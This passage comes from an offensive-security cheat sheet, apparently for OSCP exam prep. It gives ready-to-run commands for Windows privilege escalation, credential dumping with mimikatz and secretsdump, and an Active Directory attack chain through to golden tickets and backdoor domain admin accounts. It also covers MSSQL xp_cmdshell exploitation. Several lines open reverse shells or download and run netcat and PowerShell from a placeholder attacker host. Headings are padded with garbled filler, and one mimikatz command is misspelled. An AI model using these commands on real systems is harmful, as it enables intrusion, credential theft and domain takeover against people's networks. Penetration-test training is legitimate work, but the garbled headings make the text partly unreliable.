> 
> Bash
> 
> ```
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f msi -o evil.msi
> ```

> [!example] 💾 Windows CMD: Executing Backdoor Installation Suites Silently to Force Elevated Code Operations
> 
> DOS
> 
> ```
> msiexec /quiet /qn /i C:\Temp\evil.msi
> ```

> [!note] 💾 Windows CMD: Interrogating Core Core Current Version Winlogon Registries for Stored Passwords
> 
> DOS
> 
> ```
> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
> ```

> [!note] 💾 Windows CMD: Global Traversal Search of Registry Sub-Keys Databases for Password Text
> 
> DOS
> 
> ```
> reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i "password"
> reg query HKCU /f password /t REG_SZ /s 2>nul
> ```

## ── Scheduled Tasks ─────────────────────────────────────────

> [!check] 💾 Windows CMD: Detailed Enumeration of Scheduled Background Administrative Scripts Processes
> 
> DOS
> 
> ```
> schtasks /query /fo LIST /v | findstr /i "run as\|task name\|next run\|program"
> ```

## ── Stored Credentials ──────────────────────────────────────

> [!note] 💾 Windows CMD: Query Vault Stored Security Profiles Credentials Token Collections
> 
> DOS
> 
> ```
> cmdkey /list
> ```

> [!example] 💾 Windows CMD: Processing Arbitrary Command Threads under Saved Stored Runas Privileges Contexts
> 
> DOS
> 
> ```
> runas /savecred /user:<DOMAIN>\<USER> "cmd.exe /c whoami > C:\Temp\w.txt"
> runas /savecred /user:Administrator "C:\Temp\nc.exe <LHOST> 4444 -e cmd"
> ```

## ── DLL Hijacking ───────────────────────────────────────────

> [!check] 🪟 PowerShell: Auditing System Environment PATH Directories for Writable Access Anomalies
> 
> PowerShell
> 
> ```
> $env:PATH -split ";" | % { if (Test-Path $_) { (Get-Acl $_).Access } }
> ```

## ── Interesting Files ────────────────────────────────────────

> [!note] 🪟 PowerShell: Mining Local Console Interactive Session Command Logs for Hardcoded Access Keys
> 
> PowerShell
> 
> ```
> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
> ```

> [!note] 💾 Windows CMD: Tracking Hardcoded Database Accounts Password Strings inside Local App Config Partitions
> 
> DOS
> 
> ```
> type C:\inetpub\wwwroot\web.config
> type C:\xampp\passwords.txt
> type C:\xampp\apache\conf\httpd.conf
> ```

> [!note] 💾 Windows CMD: Comprehensive Extension Tracking Keyword Search across Storage Volumes Directories
> 
> DOS
> 
> ```
> dir /s /b C:\*.txt C:\*.xml C:\*.conf C:\*.config C:\*.ini 2>nul | findstr /i "pass cred secret"
> dir /s /b C:\Users\ 2>nul | findstr /i "password\|creds\|credentials\|secret"
> ```

> [!note] 💾 Windows CMD: Reviewing Automated Deployment Configurations Blueprint Manifest Files for Plaintext Secrets
> 
> DOS
> 
> ```
> type C:\Windows\Panther\unattend.xml
> type C:\Windows\system32\sysprep\sysprep.xml
> type C:\Windows\system32\sysprep\sysprep.inf
> ```

## Dump Credentials (Windows Post-Exploitation)

> [!check] 💾 Windows CMD: Interactive Local Memory Ingestion and Security Support Accounts Hashing Extractions
> 
> DOS
> 
> ```
> .\mimikatz.exe
> privilege::debug
> sekurlsa::logonpasswords       # cleartext + NTLM
> sekurlsa::wdigest              # cleartext (older systems)
> lsadump::sam                   # local SAM hashes
> lsadump::lsa /patch            # LSA secrets
> lsadump::cache                 # cached domain creds
> sekurla::credman               #windows cred
> ```

> [!example] 💾 Windows CMD: Evasive non-Interactive Target LSASS Memory Space Dumps Processes Creation
> 
> DOS
> 
> ```
> procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
> ```

> [!check] 🐧 Linux Bash: Offline Parsing of Process Memory Dumps Containers for Account Hashes
> 
> Bash
> 
> ```
> pypykatz lsa minidump lsass.dmp
> ```

> [!check] 🐧 Linux Bash: Remote Ingress Extraction of Local Accounts Database Registries Mapping via Networks
> 
> Bash
> 
> ```
> secretsdump.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP>
> secretsdump.py -hashes <LM_HASH>:<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>
> netexec smb <TARGET_IP> -u user -p pass --sam
> netexec smb <TARGET_IP> -u user -p pass -M lsassy
> ```

> [!check] 🐧 Linux Bash: Extracting Corporate Active Directory Network Hashes Database Configurations
> 
> Bash
> 
> ```
> impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
> ```

## Windows PrivEsc Decision Tree

> [!quote] 🌳 Logic Diagram: Windows Operating System Local Privilege Elevation Path Strategy Mapping
> 
> Plaintext
> 
> ```
> whoami /priv → SeImpersonatePrivilege or SeAssignPrimaryToken?
>     └── GodPotato / PrintSpoofer / JuicyPotatoNG → SYSTEM ✓
> 
> whoami /priv → SeBackupPrivilege?
>     └── reg save SAM+SYSTEM → secretsdump → hashes → PTH → SYSTEM ✓
> 
> AlwaysInstallElevated (both keys = 1)?
>     └── msiexec malicious.msi → SYSTEM ✓
> 
> Unquoted service path + writable intermediate dir?
>     └── Place binary in unquoted path → restart service → SYSTEM ✓
> 
> Writable service binary or weak service perms?
>     └── Replace/modify → restart → SYSTEM ✓
> 
> cmdkey stored credentials?
>     └── runas /savecred → higher priv shell ✓
> 
> Autologon password in registry?
>     └── Reuse credentials elsewhere ✓
> 
> Scheduled task running as SYSTEM with writable script?
>     └── Modify script → wait/trigger → SYSTEM ✓
> 
> PowerShell history contains passwords?
>     └── Reuse credentials → PTH / direct access ✓
> 
> Nothing works? → check systeminfo patches → unpatched CVE
> ```

# 5. ACTIVE DIRECTORY ATTACK CHAINS

## ⚠️ CRITICAL: OSCP AD SET IS ASSUMED BREACH

> [!warning] **AD Set Infrastructure Boundary Target Information Reference**
> 
> Plaintext
> 
> ```
> Domain:    CORP.LOCAL
> DC IP:     192.168.x.100
> MS01 IP:   192.168.x.101  (your entry machine — you get shell here)
> MS02 IP:   10.10.10.50    (internal — must pivot from MS01)
> Username:  stephanie
> Password:  Password123
> ```

## AD Attack Chain — Full Flow

> [!abstract] 🌳 Logic Diagram: Enterprise Active Directory Lifecycle Chain Attack Sequences Flow
> 
> Plaintext
> 
> ```
> PROVIDED CREDS (stephanie:Password123)
>         │
>         ▼
> Phase 1: RAPID AD ENUMERATION
>     BloodHound + CME + PowerView
>         │
>         ▼
> Phase 2: QUICK WINS (do ALL simultaneously)
>     ├── AS-REP Roasting
>     ├── Kerberoasting  
>     ├── Password in descriptions
>     ├── SMB share hunting
>     └── GPP/SYSVOL passwords
>         │
>         ▼
> Phase 3: FOOTHOLD ON MS01 (local.txt = 10 pts)
>     Use found creds / exploit to get shell + privesc to SYSTEM/admin
>         │
>         ▼
> Phase 4: PIVOT TO MS02 (local.txt = 10 pts)
>     Setup tunnel → lateral move with found creds/hashes
>         │
>         ▼
> Phase 5: ESCALATE TO DOMAIN ADMIN
>     ACL abuse / DCSync / Delegation / GPO abuse
>         │
>         ▼
> Phase 6: OWN DC (proof.txt = 20 pts)
>     PSExec/WMIexec as DA → dump NTDS → Golden Ticket
> ```

## Phase 1: AD Enumeration with Provided Creds

> [!check] 🐧 Linux Bash: Remote Automated Active Directory Domain Trust Mapping Ingestion (BloodHound Ingestor)
> 
> Bash
> 
> ```
> bloodhound-python -u stephanie -p 'Password123' -d corp.local -ns 192.168.x.100 -c All --zip
> ```

> [!check] 💾 Windows CMD: In-Network Active Directory Object Relational Mapping Discovery (SharpHound Executable)
> 
> DOS
> 
> ```
> .\SharpHound.exe -c All --domain corp.local --zipfilename bh.zip
> ```

> [!check] 🐧 Linux Bash: Mapping Shared Directories and Password Execution Policies via Native Credentials
> 
> Bash
> 
> ```
> crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' --shares --users --groups --pass-pol
> netexec smb 192.168.x.100 -u stephanie -p 'Password123' --users --rid-brute
> ```

> [!check] 🐧 Linux Bash: Interrogating LDAP Directory Trees for User Objects Schema Configuration Profiles
> 
> Bash
> 
> ```
> ldapsearch -x -H ldap://192.168.x.100 -D "stephanie@corp.local" -w 'Password123' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description memberOf
> ```

> [!check] 🐧 Linux Bash: Targeted LDAP Query Tracking Cleartext Access Tokens inside Description Attributes
> 
> Bash
> 
> ```
> ldapsearch -x -H ldap://192.168.x.100 -D "stephanie@corp.local" -w 'Password123' -b "DC=corp,DC=local" "(&(objectClass=user)(description=*))" sAMAccountName description
> ```

> [!check] 🪟 PowerShell: Native Active Directory Management Schema Ingress Interrogation Queries (PowerView Integration)
> 
> PowerShell
> 
> ```
> # Load Module string script:
> . .\PowerView.ps1
> # Alternative download command loading string payload:
> powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1')"
> 
> # Object queries parameters executions:
> Get-DomainUser -Properties samaccountname,description | Where-Object {$_.description}
> Get-DomainGroupMember -Identity "Domain Admins" -Recurse
> Get-DomainComputer | select name,operatingsystem,dnshostname
> Get-DomainGPO | select displayname,gpcfilesyspath
> Get-DomainTrust
> Find-DomainShare -CheckShareAccess | select name,path
> Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "Write|All|Force"}
> ```

## Phase 2: Credential Attacks (Quick Wins)

## AS-REP Roasting

> [!warning] 🐧 Linux Bash: Querying Accounts Lacking Kerberos Pre-Authentication Configuration Protections
> 
> Bash
> 
> ```
> GetNPUsers.py corp.local/stephanie:'Password123' -dc-ip 192.168.x.100 -request -format hashcat -outputfile asrep.txt
> ```

> [!warning] 🐧 Linux Bash: Checking Global Domain Object Dictionary Files for Disabled Pre-Auth Parameters
> 
> Bash
> 
> ```
> GetNPUsers.py corp.local/ -usersfile domain_users.txt -dc-ip 192.168.x.100 -no-pass -format hashcat
> ```

> [!warning] 💾 Windows CMD: Native Ticket Extraction Requests targeting AS-REP Roastable Signatures
> 
> DOS
> 
> ```
> .\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
> ```

> [!check] 🐧 Linux Bash: Offline Decryption of Extracted AS-REP Pre-Authentication Ticket Hashes Matrices
> 
> Bash
> 
> ```
> hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
> hashcat -m 18200 asrep.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```

## Kerberoasting

> [!warning] 🐧 Linux Bash: Requesting Service Ticket Containers mapped to Core Application Principals (Kerberoasting)
> 
> Bash
> 
> ```
> GetUserSPNs.py corp.local/stephanie:'Password123' -dc-ip 192.168.x.100 -request -outputfile kerb.txt
> ```

> [!warning] 🐧 Linux Bash: Requesting SPN Service Tickets using Authenticated User NT Hashes Strings
> 
> Bash
> 
> ```
> GetUserSPNs.py corp.local/stephanie -hashes :<NTLM_HASH> -dc-ip 192.168.x.100 -request -outputfile kerb.txt
> ```

> [!warning] 💾 Windows CMD: Requesting Service Ticket Extraction Arrays natively from Connected Memory Loops
> 
> DOS
> 
> ```
> .\Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt
> ```

> [!check] 🐧 Linux Bash: Offline Decryption of Extracted SPN Account TGS Ticket Hashes Data
> 
> Bash
> 
> ```
> hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
> hashcat -m 13100 kerb.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```

## Password Spray (with lockout awareness)

> [!check] 🐧 Linux Bash: Requesting Target Active Domain Lockout Threshold Execution Matrix Rules
> 
> Bash
> 
> ```
> crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' --pass-pol
> ```

> [!check] 🐧 Linux Bash: Running Low-Velocity Multi-Account Domain Password Sprays to Avoid Lockouts
> 
> Bash
> 
> ```
> crackmapexec smb 192.168.x.100 -u domain_users.txt -p 'Password123' --continue-on-success 2>/dev/null | grep "+"
> kerbrute passwordspray -d corp.local --dc 192.168.x.100 domain_users.txt 'Password123'
> kerbrute passwordspray -d corp.local --dc 192.168.x.100 domain_users.txt 'Corp2024!'
> ```

> [!check] 🐧 Linux Bash: Validating User Account Signatures via Kerberos Domain Controllers Interaction Loops
> 
> Bash
> 
> ```
> ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
> ```

> [!check] 🐧 Linux Bash: Running Targeted Multi-User Wordlist Sprays over Network SMB Protocols
> 
> Bash
> 
> ```
> netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
> ```

## GPP / SYSVOL

> [!check] 🐧 Linux Bash: Automated Harvesting of Encrypted Group Policy Preferences Passwords from Domain Volumes
> 
> Bash
> 
> ```
> crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_password
> crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_autologin
> ```

> [!info] 🐧 Linux Bash: Manual Authenticated Session Interrogation of Sysvol Allocation Partitions
> 
> Bash
> 
> ```
> smbclient //192.168.x.100/SYSVOL -U 'corp.local/stephanie%Password123'
> ```

> [!check] 🐧 Linux Bash: Scanning Shared Policy Configurations XML Repositories for Writable Passwords
> 
> Bash
> 
> ```
> find /mnt/sysvol -name "*.xml" 2>/dev/null | xargs grep -l "cpassword"
> gpp-decrypt <CPASSWORD_VALUE>
> ```

## Phase 3 & 4: Lateral Movement

## Pass-the-Hash

> [!check] 🐧 Linux Bash: Testing Inbound Target Network Access Profiles using Discovered Local Account Hashes
> 
> Bash
> 
> ```
> crackmapexec smb <TARGET_IP> -u Administrator -H <NTLM_HASH> --local-auth
> netexec smb <TARGET_IP> -u user -H <NTLM_HASH>
> ```

> [!check] 🐧 Linux Bash: Broad Range Subnet Account Verification via Pass-The-Hash Injection Loops
> 
> Bash
> 
> ```
> crackmapexec smb 10.10.10.0/24 -u Administrator -H <NTLM_HASH> --local-auth --continue-on-success | grep "+"
> ```

> [!example] 🐧 Linux Bash: Spawning Interactive Remote Process Terminals via Injected NT Hashes Strings
> 
> Bash
> 
> ```
> psexec.py corp.local/Administrator@<TARGET_IP> -hashes :<NTLM_HASH>
> wmiexec.py corp.local/Administrator@<TARGET_IP> -hashes :<NTLM_HASH>
> smbexec.py corp.local/Administrator@<TARGET_IP> -hashes :<NTLM_HASH>   # no binary on disk
> evil-winrm -i <TARGET_IP> -u Administrator -H <NTLM_HASH>
> ```

## Pass-the-Ticket

> [!check] 💾 Windows CMD: Triage Auditing of Stored Kerberos Authentication Tickets in Current Session Memory
> 
> DOS
> 
> ```
> .\Rubeus.exe triage
> .\Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap
> ```

> [!example] 💾 Windows CMD: Injecting Extracted Base64 Kerberos Ticket Strings into System Volatile Space (Pass-The-Ticket)
> 
> DOS
> 
> ```
> .\Rubeus.exe ptt /ticket:<BASE64_TICKET>
> ```

> [!example] 💾 Windows CMD: Generating Remote Authentication Tickets natively via Stored Secret Passwords
> 
> DOS
> 
> ```
> .\Rubeus.exe asktgt /user:administrator /rc4:<NTLM_HASH> /domain:corp.local /dc:192.168.x.100 /ptt
> dir \\<TARGET_FQDN>\C$
> ```

> [!example] 🐧 Linux Bash: Registering Exfiltrated Credential Caches for Corporate Kerberos Authenticated Access Paths
> 
> Bash
> 
> ```
> export KRB5CCNAME=/tmp/ticket.ccache
> psexec.py -k -no-pass corp.local/administrator@<TARGET_FQDN>
> ```

## Overpass-the-Hash

> [!example] 💾 Windows CMD: Generating Valid Kerberos Domain TGT Containers via Local Pass-The-Hash Conversion Calls
> 
> DOS
> 
> ```
> .\Rubeus.exe asktgt /user:user /rc4:<NTLM_HASH> /domain:corp.local /ptt
> ```

> [!example] 🐧 Linux Bash: Requesting Outbound Domain TGT Sessions over Network Channels via NT Hashing Arrays
> 
> Bash
> 
> ```
> getTGT.py corp.local/user -hashes :<NTLM_HASH> -dc-ip 192.168.x.100
> export KRB5CCNAME=user.ccache
> psexec.py -k -no-pass corp.local/user@<TARGET_FQDN>
> ```

## Phase 5: Privilege Escalation to Domain Admin

## DCSync Attack

> [!check] 🪟 PowerShell: Verifying Inbound Account Profile Active Directory Database Synchronization Replication Rights
> 
> PowerShell
> 
> ```
> Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs | \
>     ? {($_.ObjectAceType -match "Replication-Get") -and \
>        ($_.ActiveDirectoryRights -match "ExtendedRight")}
> ```

> [!check] 🐧 Linux Bash: Launching Remote DCSync Administrative Accounts Replication Requests (Domain Admin Ingress Vectors)
> 
> Bash
> 
> ```
> secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc
> secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user krbtgt
> secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user Administrator
> ```

> [!check] 💾 Windows CMD: Native DCSync Active Directory Credential Extraction Loops (Mimikatz Lsadump Provider)
> 
> DOS
> 
> ```
> lsadump::dcsync /user:krbtgt /domain:corp.local
> lsadump::dcsync /user:Administrator /domain:corp.local
> lsadump::dcsync /all /domain:corp.local     # ALL hashes
> ```

## ACL Abuse — Common Paths from BloodHound

> [!example] 🪟 PowerShell: Forcing Domain Object Security Secret Resets via Write Configuration Rights Abuses
> 
> PowerShell
> 
> ```
> Set-DomainUserPassword -Identity targetuser \
>     -AccountPassword (ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force) \
>     -Credential $cred
> ```

> [!example] 🪟 PowerShell: Direct Account Propagation into Privileged Security Group Objects Structures (ACL Abuse Vector)
> 
> PowerShell
> 
> ```
> Add-DomainGroupMember -Identity "Domain Admins" -Members stephanie
> Get-DomainGroupMember -Identity "Domain Admins"
> ```

> [!example] 🪟 PowerShell: Forcing Arbitrary Assignment of DCSync Security Rights over Active Domain Controllers
> 
> PowerShell
> 
> ```
> Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity stephanie -Rights DCSync
> ```

> [!example] 🪟 PowerShell: Resetting Target Domain Accounts Access Strings via ForceChangePassword Rights
> 
> PowerShell
> 
> ```
> Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
> ```

> [!example] 🪟 PowerShell: Modifying Domain Object Identity Security Owner Context Parameters to Gain System Permissions
> 
> PowerShell
> 
> ```
> Set-DomainObjectOwner -Identity targetobject -OwnerIdentity stephanie
> Add-DomainObjectAcl -TargetIdentity targetobject -PrincipalIdentity stephanie -Rights All
> ```

> [!example] 🐧 Linux Bash: Inbound Resource-Based Constrained Delegation Attacks (Step 1: Injected Machine Generation Account)
> 
> Bash
> 
> ```
> addcomputer.py -computer-name 'ATTACKPC$' -computer-pass 'Attack123!' \
>     'corp.local/stephanie:Password123' -dc-ip 192.168.x.100
> ```

> [!example] 🐧 Linux Bash: Modifying Computer Objects Allowed-To-Act Delegation Security Permissions Matrix (Step 2: RBCD Setup)
> 
> Bash
> 
> ```
> rbcd.py -delegate-to <TARGET_COMPUTER>$ -delegate-from ATTACKPC$ \
>     -dc-ip 192.168.x.100 -action write 'corp.local/stephanie:Password123'
> ```

> [!example] 🐧 Linux Bash: Requesting an Impersonated Service Ticket for Corporate Target Hosts Ingress Access (Step 3: RBCD Ingress)
> 
> Bash
> 
> ```
> getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
>     'corp.local/ATTACKPC$:Attack123!' -dc-ip 192.168.x.100
> ```

> [!example] 🐧 Linux Bash: Executing Administrative Code Processes over Compromised RBCD Shared Host Mounts (Step 4: Final DA Shell)
> 
> Bash
> 
> ```
> export KRB5CCNAME=Administrator@cifs_<TARGET_FQDN>@CORP.LOCAL.ccache
> secretsdump.py -k -no-pass corp.local/Administrator@<TARGET_FQDN>
> psexec.py -k -no-pass corp.local/Administrator@<TARGET_FQDN>
> ```

## Constrained Delegation Abuse

> [!check] 🪟 PowerShell: Searching the Domain Schema for Accounts Assigned Trusted-To-Authentication Privileges
> 
> PowerShell
> 
> ```
> Get-DomainUser -TrustedToAuth | select samaccountname,msDS-AllowedToDelegateTo
> Get-DomainComputer -TrustedToAuth | select name,msDS-AllowedToDelegateTo
> ```

> [!example] 🐧 Linux Bash: Exploiting Constrained Delegation Objects via S4U Service Ticket Generation Loops
> 
> Bash
> 
> ```
> getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
>     -dc-ip 192.168.x.100 'corp.local/<DELEG_USER>:<DELEG_PASS>'
> export KRB5CCNAME=Administrator@cifs_<TARGET_FQDN>@CORP.LOCAL.ccache
> psexec.py -k -no-pass corp.local/Administrator@<TARGET_FQDN>
> ```

## Unconstrained Delegation Abuse

> [!check] 🪟 PowerShell: Scanning Domain Compute Nodes to Identify Unconstrained Delegation Configurations Weaknesses
> 
> PowerShell
> 
> ```
> Get-DomainComputer -Unconstrained | select name,dnshostname
> ```

> [!example] 💾 Windows CMD: Launching Active Monitoring Infrastructure Arrays targeting Incoming Security Token Transactions
> 
> DOS
> 
> ```
> .\Rubeus.exe monitor /interval:5 /filteruser:DC$
> ```

> [!example] 🐧 Linux Bash: Coercing High-Privilege Domain Assets Connection Streams via Legacy Spooler Protocols (PrinterBug)
> 
> Bash
> 
> ```
> python3 printerbug.py corp.local/stephanie:'Password123'@<DC_IP> <UNCONS_DELEG_IP>
> ```

> [!example] 🐧 Linux Bash: Coercing Direct Inbound Domain Controller Connections via Alternate Network Shares (PetitPotam)
> 
> Bash
> 
> ```
> python3 PetitPotam.py -u stephanie -p 'Password123' <UNCONS_DELEG_IP> <DC_IP>
> ```

# Phase 6: Domain Dominance

> [!example] 🐧 Linux Bash: Forging Corporate Golden Tickets Identities Sessions (DCSync Krbtgt Secret Matrix Requirement)
> 
> Bash
> 
> ```
> lookupsid.py corp.local/user:'pass'@192.168.x.100 | grep "Domain SID"
> ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain corp.local Administrator
> export KRB5CCNAME=Administrator.ccache
> psexec.py -k -no-pass corp.local/Administrator@<DC_FQDN>
> ```

> [!example] 💾 Windows CMD: Native Assembly Forging of Persistent Active Directory Corporate Golden Tickets (Mimikatz Engine)
> 
> DOS
> 
> ```
> kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXX /krbtgt:<KRBTGT_NTLM_HASH> /ptt
> misc::cmd
> ```

> [!example] 🐧 Linux Bash: Crafting Targeted Corporate Silver Tickets for Specific Host Resource Channel Interceptions
> 
> Bash
> 
> ```
> ticketer.py -nthash <SERVICE_ACCOUNT_NTLM> -domain-sid S-1-5-21-XXX -domain corp.local -spn cifs/<TARGET_FQDN> Administrator
> export KRB5CCNAME=Administrator.ccache
> smbclient.py -k -no-pass //<TARGET_FQDN>/C$
> ```

> [!check] 🐧 Linux Bash: Mass Extraction Triage Dump of Corporate Domains Configuration Parameters Secrets
> 
> Bash
> 
> ```
> secretsdump.py corp.local/Administrator:'pass'@192.168.x.100 -just-dc
> secretsdump.py -hashes <LM>:<NTLM> corp.local/Administrator@192.168.x.100
> ```

> [!example] 🪟 PowerShell: Injecting Persistent Local Accounts Entities inside the Wide Active Directory Schema Trees
> 
> PowerShell
> 
> ```
> net user backdoor P@ssw0rd! /add /domain
> net group "Domain Admins" backdoor /add /domain
> ```

# 6. MSSQL — RCE & LATERAL MOVEMENT

> [!abstract] 🌳 Markdown List: MSSQL Infrastructure Threat Vector Footprint Capabilities Checklist
> 
> Plaintext
> 
> ```
> - Initial RCE via xp_cmdshell (if SA or sysadmin creds)
> - Lateral movement via linked servers
> - Hash capture via UNC path injection → crack/relay
> - Privilege escalation via impersonation
> ```

## Step 1: Connect to MSSQL

> [!check] 🐧 Linux Bash: Remote Authenticated Inbound Database Context Connection Mapping over Networks
> 
> Bash
> 
> ```
> mssqlclient.py corp.local/sa@<TARGET_IP> -windows-auth
> mssqlclient.py sa@<TARGET_IP>                          # SQL auth (no -windows-auth)
> mssqlclient.py corp.local/user:'pass'@<TARGET_IP> -windows-auth
> ```

> [!check] 💾 Windows CMD: Local Endpoint Inline Structural Transact-SQL Connection Execution Engines
> 
> DOS
> 
> ```
> sqlcmd -S <TARGET_IP> -U sa -P password -Q "SELECT @@version"
> ```

> [!check] 🪟 PowerShell: Automated Domain-Wide SQL Engine Authentication Capability Mapping Scripts
> 
> PowerShell
> 
> ```
> . .\PowerUpSQL.ps1
> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
> ```

## Step 2: Enumerate MSSQL

> [!info] 🗄️ SQL Script: In-Database Security Roles Mapping and Environment Variable Tracking Lookups
> 
> SQL
> 
> ```
> SELECT @@version;
> SELECT SYSTEM_USER;        -- SQL login name
> SELECT USER_NAME();        -- DB user
> SELECT IS_SRVROLEMEMBER('sysadmin');    -- 1 = yes, sysadmin!
> 
> -- Enumerate all databases:
> SELECT name FROM master.dbo.sysdatabases;
> 
> -- Users and roles:
> SELECT name, type_desc FROM master.sys.server_principals;
> SELECT IS_SRVROLEMEMBER('sysadmin', name) AS is_sa, name FROM master.sys.server_principals WHERE type = 'S';
> 
> -- Check impersonation rights (CRITICAL — see section below):
> SELECT distinct b.name FROM sys.server_permissions a
> INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
> WHERE a.permission_name = 'IMPERSONATE';
> 
> -- Linked servers (CRITICAL — see section below):
> SELECT srvname, srvproduct, isremote FROM master..sysservers;
> EXEC sp_linkedservers;
> ```

## Step 3: Enable xp_cmdshell (if sysadmin)

> [!example] 🗄️ SQL Script: Reconfiguring Global In-Database Environment Variables to Enable Operating System Command Injection Handlers
> 
> SQL
> 
> ```
> -- Check if xp_cmdshell is enabled:
> SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
> 
> -- Enable it:
> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
> 
> -- Execute commands:
> EXEC xp_cmdshell 'whoami';
> EXEC xp_cmdshell 'net user';
> EXEC xp_cmdshell 'ipconfig';
> 
> -- One-liner reverse shell (generate b64 with msfvenom or revshells.com):
> EXEC xp_cmdshell 'powershell -nop -w hidden -enc <BASE64_PAYLOAD>';
> 
> -- Download and execute:
> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://<LHOST>/nc.exe -OutFile C:\Windows\Temp\nc.exe"';
> EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe <LHOST> 4444 -e cmd';
> 
> -- Add admin user:
> EXEC xp_cmdshell 'net user hax P@ss123! /add && net localgroup administrators hax /add';
> ```

## Step 4: Impersonation Attack (non-sysadmin → sysadmin)

> [!example] 🗄️ SQL Script: Escalating Local Database Sessions Access via Impersonation Tokens Modification Abuses
> 
> SQL
> 
> ```
> -- First check who you can impersonate:
> SELECT distinct b.name FROM sys.server_permissions a
> INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
> WHERE a.permission_name = 'IMPERSONATE';
> 
> -- Impersonate SA or sysadmin user:
> EXECUTE AS LOGIN = 'sa';
> SELECT IS_SRVROLEMEMBER('sysadmin');   -- Should return 1 now
> 
> -- Now enable xp_cmdshell and get RCE:
> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
> EXEC xp_cmdshell 'whoami';
> 
> -- Revert back (if needed):
> REVERT;
> ```

## Step 5: Linked Server Lateral Movement

> [!example] 🗄️ SQL Script: Horizontal Multi-Hop Target Database Clusters Compromise Loops (sp_linkedservers Abuse Vectors)
> 
> SQL
> 
> ```
> -- Enumerate linked servers from current MSSQL:
> EXEC sp_linkedservers;
> SELECT srvname, isremote FROM master..sysservers;
> 
> -- Test execution on linked server (Single hop: MS01 → MS02):
> SELECT * FROM OPENQUERY("<LINKED_SERVER_NAME>", 'SELECT @@version, @@servername, SYSTEM_USER');
> SELECT * FROM OPENQUERY("MS02\SQLEXPRESS", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
> 
> -- Execute xp_cmdshell on linked server:
> EXEC ('xp_cmdshell ''whoami''') AT [MS02\SQLEXPRESS];
> -- Or via OPENQUERY:
> SELECT * FROM OPENQUERY("MS02\SQLEXPRESS", 'EXEC xp_cmdshell ''whoami''');
> 
> -- Enable xp_cmdshell on linked server if not enabled:
> EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [MS02\SQLEXPRESS];
> EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [MS02\SQLEXPRESS];
> EXEC ('xp_cmdshell ''powershell -enc <BASE64_PAYLOAD>''') AT [MS02\SQLEXPRESS];
> 
> -- Double hop (MS01 → MS02 → MS03):
> EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [MS03]') AT [MS02\SQLEXPRESS];
> 
> -- Get reverse shell on MS02 from MS01's MSSQL link:
> EXEC ('xp_cmdshell ''powershell -c "Invoke-WebRequest http://<LHOST>/nc.exe -OutFile C:\Windows\Temp\nc.exe; C:\Windows\Temp\nc.exe <LHOST> 5555 -e cmd"''') AT [MS02\SQLEXPRESS];
> ```

## Step 6: UNC Path Injection → Hash Capture

> [!abstract] 🐧 Linux Bash: Preparing Inbound Network Share Traffic Capturing Engines (Responder Integration)
> 
> Bash
> 
> ```
> sudo responder -I tun0 -v
> ```

> [!example] 🗄️ SQL Script: Forcing Remote Database Engines Outbound Access Connection to Attacker Mounts
> 
> SQL
> 
> ```
> EXEC xp_dirtree '\\<LHOST>\share';
> EXEC xp_fileexist '\\<LHOST>\share\file';
> -- Or via SQLi in web app: '; EXEC xp_dirtree '\\<LHOST>\x'; --
> ```

> [!check] 🐧 Linux Bash: Running Decryption Attacks against Captured NetNTLMv2 Network Exchanges
> 
> Bash
> 
> ```
> hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt
> ```

